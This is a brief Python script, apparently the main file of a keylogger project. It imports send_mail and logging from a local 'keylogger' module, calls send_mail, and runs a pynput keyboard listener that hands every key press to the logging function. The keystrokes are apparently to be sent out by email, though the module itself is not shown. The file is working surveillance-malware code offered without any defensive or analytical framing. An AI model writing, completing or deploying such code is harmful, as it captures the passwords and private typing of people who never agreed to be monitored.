from keylogger import send_mail, logging

from pynput.keyboard import Listener


send_mail()

with Listener(on_press=logging) as listener:
    listener.join()